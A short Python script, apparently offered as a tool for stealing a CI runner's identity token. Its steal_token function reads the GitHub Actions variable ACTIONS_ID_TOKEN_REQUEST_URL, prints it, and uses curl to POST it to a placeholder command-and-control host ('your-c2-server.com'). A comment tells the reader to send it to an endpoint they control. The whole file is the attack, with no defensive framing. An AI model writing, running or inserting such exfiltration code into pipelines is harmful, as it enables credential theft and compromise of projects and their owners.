import os
import subprocess

def steal_token():
    # Attempt to read the environment variable that holds the runner's identity
    token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    if token:
        print(f"TOKEN_FOUND: {token}")
        # Send this token to a logging endpoint you control
        subprocess.run(["curl", "-s", "-X", "POST", "-d", token, "https://your-c2-server.com"])
    else:
        print("TOKEN_NOT_EXPOSED")

if __name__ == "__main__":
    steal_token()
